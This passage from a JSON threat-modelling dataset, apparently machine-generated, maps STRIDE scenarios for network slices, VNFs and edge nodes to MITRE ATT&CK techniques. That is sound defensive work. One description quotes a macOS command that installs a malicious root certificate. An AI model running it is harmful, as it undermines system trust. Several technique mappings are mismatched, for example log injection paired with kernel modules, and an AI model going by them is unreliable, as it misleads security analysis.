                    "Assumption": "The attacker possesses credible stolen credentials.",
                    "Role": "Attacker",
                    "Condition": "Accurate stolen credentials are in the attacker's possession."
                },
                {
                    "Assumption": "There is a lack of user activity monitoring.",
                    "Role": "Administrator",
                    "Condition": "No or poor activity tracking of user actions."
                }
            ],
            "Potential Impact": "Potential disruption to system or data access.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "unauthorized changes",
                "stolen credentials",
                "logging deficient"
            ],
            "mitre_technique": {
                "name": "Cloud Service Dashboard",
                "description": "An adversary may use a cloud service dashboard GUI with stolen credentials to gain useful information from an operational cloud environment, such as specific services, resources, and features. For example, the GCP Command Center can be used to view all assets, findings of potential security risks, and to run additional queries, such as finding public IP addresses and open ports.(Citation: Google Command Center Dashboard)\n\nDepending on the configuration of the environment, an adversary may be able to enumerate more information via the graphical dashboard than an API. This allows the adversary to gain information without making any API requests.",
                "id": "attack-pattern--e49920b0-6c54-40c1-9571-73723653205f",
                "technique_id": "T1538"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Logs from external interfaces are modified to obscure the source of malicious activities.",
            "Assumptions": [
                {
                    "Assumption": "Access to external interfaces is insufficiently monitored.",
                    "Role": "System",
                    "Condition": "External links lack stringent access logging."
                },
                {
                    "Assumption": "Log files do not have read-only or integrity protections.",
                    "Role": "System",
                    "Condition": "Logs can be modified without detection."
                },
                {
                    "Assumption": "Threat actors have advanced capabilities involving log manipulation.",
                    "Role": "Attacker",
                    "Condition": "Advanced and persistent actors like Worok or GALLIUM are involved."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log modification",
                "external interfaces",
                "obscuration"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data is intercepted via a man-in-the-middle attack on external interfaces.",
            "Assumptions": [
                {
                    "Assumption": "Data transmitted over external interfaces is not encrypted.",
                    "Role": "System",
                    "Condition": "Data is transmitted in plaintext."
                },
                {
                    "Assumption": "Attackers can position themselves between communications.",
                    "Role": "Attacker",
                    "Condition": "Network vulnerabilities allow intermediary positioning."
                },
                {
                    "Assumption": "Users or components do not verify the authenticity of endpoints.",
                    "Role": "User/System",
                    "Condition": "Endpoints do not have identity verification or mutual authentication."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "man-in-the-middle",
                "external interfaces",
                "sensitive data"
            ],
            "mitre_technique": {
                "name": "Install Root Certificate",
                "description": "Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate. (Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.\n\nInstallation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials. (Citation: Operation Emmental)\n\nAtypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide a man-in-the-middle capability for intercepting information transmitted over secure TLS/SSL communications. (Citation: Kaspersky Superfish)\n\nRoot certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence. (Citation: SpectorOps Code Signing Dec 2017)\n\nIn macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious certificate as a trusted root certificate into the system keychain. (Citation: objective-see ay mami 2018)",
                "id": "attack-pattern--d519cfd5-f3a8-43a9-a846-ed0bb40672b1",
                "technique_id": "T1130"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized access to sensitive data within VNFs due to misconfigured access controls.",
            "Assumptions": [
                {
                    "Assumption": "Access controls are weak or misconfigured.",
                    "Role": "Administrator",
                    "Condition": "Misconfigured access policies."
                },
                {
                    "Assumption": "Attackers can exploit access control weaknesses.",
                    "Role": "Attacker",
                    "Condition": "Knowledge and tools to exploit access control flaws."
                },
                {
                    "Assumption": "Data within VNFs is not properly segmented or encrypted.",
                    "Role": "System",
                    "Condition": "Lack of data encryption and segregation."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "misconfigured access controls",
                "VNF",
                "sensitive data"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "A malware attack targets edge computing nodes to extract sensitive data from low-latency applications.",
            "Assumptions": [
                {
                    "Assumption": "Edge computing nodes are vulnerable to malware.",
                    "Role": "Administrator",
                    "Condition": "Lack of malware protection on edge nodes."
                },
                {
                    "Assumption": "Malware can successfully exfiltrate data without detection.",
                    "Role": "Attacker",
                    "Condition": "Advanced malware with obfuscation techniques."
                },
                {
                    "Assumption": "Sensitive data is processed or stored at the edge.",
                    "Role": "System",
                    "Condition": "Edge nodes handle sensitive tasks or data."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "malware",
                "edge computing",
                "sensitive data"
            ],
            "mitre_technique": {
                "name": "Rootkit",
                "description": "Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting/hooking and modifying operating system API calls that supply system information. (Citation: Symantec Windows Rootkits) \n\nRootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a hypervisor, Master Boot Record, or [System Firmware](https://attack.mitre.org/techniques/T1542/001). (Citation: Wikipedia Rootkit) Rootkits have been seen for Windows, Linux, and Mac OS X systems. (Citation: CrowdStrike Linux Rootkit) (Citation: BlackHat Mac OSX Rootkit)",
                "id": "attack-pattern--0f20e3cb-245b-4a61-8a91-2d93f7cb0e9b",
                "technique_id": "T1014"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods network slices with traffic, overwhelming the virtualized infrastructure and causing service degradation.",
            "Assumptions": [
                {
                    "Assumption": "Network infrastructure lacks defensive scaling or rate limiting mechanisms.",
                    "Role": "System",
                    "Condition": "Absence of advanced DDoS mitigation tools."
                },
                {
                    "Assumption": "The attacker has the resources to generate large volumes of traffic.",
                    "Role": "Attacker",
                    "Condition": "Botnets or other amplification resources are available."
                },
                {
                    "Assumption": "Network slices share common physical underlay resources.",
                    "Role": "System",
                    "Condition": "Common physical infrastructure without adequate isolation."
                }
            ],
            "Potential Impact": "Disruption to system or data access.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "traffic flood",
                "network slices",
                "virtualized infrastructure"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A targeted attack exhausts the resources of specific VNFs, causing performance degradation or failure.",
            "Assumptions": [
                {
                    "Assumption": "VNFs do not have resource usage limits enforced.",
                    "Role": "System",
                    "Condition": "Lacking resource quotas or throttling mechanisms."
                },
                {
                    "Assumption": "Attackers can direct significant load or requests to VNFs.",
                    "Role": "Attacker",
                    "Condition": "Exploiting service endpoints without proper limits."
                },
                {
                    "Assumption": "Monitoring to detect abnormal resource usage is absent.",
                    "Role": "Administrator",
                    "Condition": "Ineffective resource usage monitoring."
                }
            ],
            "Potential Impact": "Potential disruption to system or data access.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "resource exhaustion",
                "VNF",
                "performance degradation"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Orchestration and management tools are targeted to prevent the deployment of new network slices or management of existing ones.",
            "Assumptions": [
                {
                    "Assumption": "Orchestration tools lack redundancy and failover capabilities.",
                    "Role": "System",
                    "Condition": "Single points of failure in management systems."
                },
                {
                    "Assumption": "The attacker has identified and is exploiting portal vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Vulnerable web interfaces or APIs."
                },
                {
                    "Assumption": "Adequate access controls are not enforced.",
                    "Role": "Administrator",
                    "Condition": "Weak or ineffective access control mechanisms."
                }
            ],
            "Potential Impact": "Potential disruption to system or data access.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "orchestration tools",
                "management systems",
                "deployment prevention"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits vulnerabilities in VNFs to escalate their privileges and access restricted areas of the network slices.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has discovered and exploits software vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Exploiting zero-days or known vulnerabilities in VNF software."
                },
                {
                    "Assumption": "VNFs lack proper patch management and updates.",
                    "Role": "Administrator",
                    "Condition": "Outdated software with unresolved vulnerabilities."
                },
                {
                    "Assumption": "Access control mechanisms do not sufficiently restrict VNF interactions.",
                    "Role": "System",
                    "Condition": "Weak inter-VNF access control policies."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "VNF",
                "vulnerabilities",
                "restricted access"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploiting vulnerabilities in orchestration components to gain administrative access to management tools.",
            "Assumptions": [
                {
                    "Assumption": "Orchestration components contain exploitable flaws.",
                    "Role": "System",
                    "Condition": "Unpatched vulnerabilities within orchestration software."
                },
                {
                    "Assumption": "Attacker has knowledge of orchestration component flaws.",
                    "Role": "Attacker",
                    "Condition": "Exploit information is accessible or attacker has reconnaissance capabilities."
                },
                {
                    "Assumption": "The environment lacks privilege separation and least privilege principles.",
                    "Role": "System",
                    "Condition": "Over-privileged accounts in a management domain."
                }
            ],
            "Potential Impact": "Potential disruption to system or data access.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "orchestration components",
                "administrative access",
                "system management"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--2fe353a7-656e-4f9f-a57f-cad44e4f2852",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Using malware to exploit the edge node vulnerabilities and gain higher access within the network slice.",
            "Assumptions": [
                {
                    "Assumption": "Edge nodes are running vulnerable or outdated software.",
                    "Role": "Administrator",
                    "Condition": "Delayed or insufficient patch management on edge nodes."
                },
                {
                    "Assumption": "Attackers can deploy malware onto edge nodes through vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Advanced malware like DarkCrystal RAT is utilized."
                },
                {
                    "Assumption": "Segregation policies between different access levels are weak.",
                    "Role": "System",
                    "Condition": "Unclear and overlapping access rights."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "malware",
                "edge nodes",
                "network slice"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        }
    ]
},
{
    "case_number": "3",
    "batch_number": "14",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a trusted network function to gain unauthorized access to network slices.",
            "Assumptions": [
                {
                    "Assumption": "Network function names or identifiers are not strongly authenticated.",
                    "Role": "Network Administrator",
                    "Condition": "During initial setup or modification of network functions."
                },
                {
                    "Assumption": "Attackers have access to the same network segments as legitimate network functions.",
                    "Role": "Network Security Engineer",
                    "Condition": "In environments with weak network segmentation."
                },
                {
                    "Assumption": "Network functions do not utilize mutual TLS for communication.",
                    "Role": "Infrastructure Architect",
                    "Condition": "In cost-saving or simplified deployment scenarios."
                }
            ],
            "Potential Impact": "Data Confidentiality, Data Integrity",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network function",
                "authentication bypass"
            ],
            "mitre_technique": {
                "name": "ARP Cache Poisoning",
                "description": "Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nThe ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address.(Citation: RFC826 ARP) Devices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache.\n\nAn adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.\n\nThe ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.(Citation: Sans ARP Spoofing Aug 2003)(Citation: Cylance Cleaver)\n\nAdversaries may use ARP cache poisoning as a means to intercept network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol.(Citation: Sans ARP Spoofing Aug 2003)\n",
                "id": "attack-pattern--cabe189c-a0e3-4965-a473-dcff00f17213",
                "technique_id": "T1557.002"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "A malicious actor gains control of a VNF instance by spoofing the orchestration management API.",
            "Assumptions": [
                {
                    "Assumption": "API endpoints are not protected with strong authentication mechanisms.",
                    "Role": "API Developer",
                    "Condition": "When developing or configuring the API."
                },
                {
                    "Assumption": "Malicious actor has knowledge of the API structure and endpoints.",
                    "Role": "Threat Intelligence Analyst",
                    "Condition": "Information leakage or inside knowledge."
                },
                {
                    "Assumption": "Security monitoring on API traffic is not robust.",
                    "Role": "Security Operations Center (SOC) Analyst",
                    "Condition": "In environments without continuous API traffic analysis."
                }
            ],
            "Potential Impact": "Data Integrity, System Availability",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "API",
                "orchestration management"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An unauthorized user spoofs their identity to gain access to the management interfaces of the NFVO.",
            "Assumptions": [
                {
                    "Assumption": "Management interfaces do not require multi-factor authentication (MFA).",
                    "Role": "Network Administrator",
                    "Condition": "During initial setup or due to policy oversight."
                },
                {
                    "Assumption": "Management interface credentials are accessible through unsecured storage systems.",
                    "Role": "Security Officer",
                    "Condition": "Due to improper handling of credentials."
                },
                {
                    "Assumption": "There are no strict access controls or identity verification processes in place.",
                    "Role": "IT Manager",
                    "Condition": "In a rush to streamline operations."
                }
            ],
            "Potential Impact": "Data Confidentiality, Data Integrity",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "identity theft",
                "management interface"
            ],
            "mitre_technique": {
                "name": "Phishing",
                "description": "Adversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns.\n\nAdversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. Phishing may also be conducted via third-party services, like social media platforms. Phishing may also involve social engineering techniques, such as posing as a trusted source, as well as evasive techniques such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g., [Email Hiding Rules](https://attack.mitre.org/techniques/T1564/008)).(Citation: Microsoft OAuth Spam 2022)(Citation: Palo Alto Unit 42 VBA Infostealer 2014) Another way to accomplish this is by forging or spoofing(Citation: Proofpoint-spoof) the identity of the sender which can be used to fool both the human recipient as well as automated security tools.(Citation: cyberproof-double-bounce) \n\nVictims may also receive phishing messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware,(Citation: sygnia Luna Month)(Citation: CISA Remote Monitoring and Management Software) or install adversary-accessible remote management tools onto their computer (i.e., [User Execution](https://attack.mitre.org/techniques/T1204)).(Citation: Unit42 Luna Moth)",
                "id": "attack-pattern--a62a8db3-f23a-4d8f-afd6-9dbc77e7813b",
                "technique_id": "T1566"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the configuration of a network slice to degrade performance.",
            "Assumptions": [
                {
                    "Assumption": "Configuration management systems are not properly secured.",
                    "Role": "Configuration Manager",
                    "Condition": "During configuration changes or updates."
                },
                {
                    "Assumption": "Access to configuration files is not restricted to authorized personnel.",
                    "Role": "System Administrator",
                    "Condition": "In environments with lax internal security policies."
                },
                {
                    "Assumption": "Change management process is not followed consistently.",
                    "Role": "Project Manager",
                    "Condition": "Due to process negligence or expediency."
                }
            ],
            "Potential Impact": "System Availability, Data Integrity",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "configuration files",
                "network slice"
            ],
            "mitre_technique": {
                "name": "File and Directory Permissions Modification",
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nModifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory\u2019s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).\n\nAdversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths.(Citation: new_rust_based_ransomware)(Citation: bad_luck_blackcat)(Citation: falconoverwatch_blackcat_attack)(Citation: blackmatter_blackcat)(Citation: fsutil_behavior) ",
                "id": "attack-pattern--65917ae0-b854-4139-83fe-bf2441cf0196",
                "technique_id": "T1222"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "A malicious entity injects false data into logs generated by network functions to obscure their activities.",
            "Assumptions": [
                {
                    "Assumption": "Log integrity checks are not performed regularly.",
                    "Role": "Security Analyst",
                    "Condition": "In systems with inadequate log monitoring."
                },
                {
                    "Assumption": "Logging systems are accessible without proper authentication.",
                    "Role": "Log Management Administrator",
                    "Condition": "To streamline access or due to misconfiguration."
                },
                {
                    "Assumption": "Log channels do not use secure transmission protocols.",
                    "Role": "Network Engineer",
                    "Condition": "In cost-cutting or legacy system scenarios."
                }
            ],
            "Potential Impact": "Data Integrity, Incident Response",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "log injection",
                "false data"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker alters firmware of edge computing nodes to manipulate data processing.",
            "Assumptions": [
                {
                    "Assumption": "Firmware update mechanisms are not properly secured.",
                    "Role": "Device Administrator",
                    "Condition": "During firmware updates or maintenance."
                },
                {
                    "Assumption": "Physical access to edge computing nodes is not strictly controlled.",
                    "Role": "Facilities Manager",
                    "Condition": "In environments with relaxed physical security."
                },
                {
                    "Assumption": "Edge computing nodes do not have secure boot mechanisms.",
                    "Role": "Hardware Engineer",
                    "Condition": "In older or budget-constrained hardware deployments."
                }
            ],
            "Potential Impact": "Data Integrity, Data Confidentiality",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "firmware",
                "edge computing"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
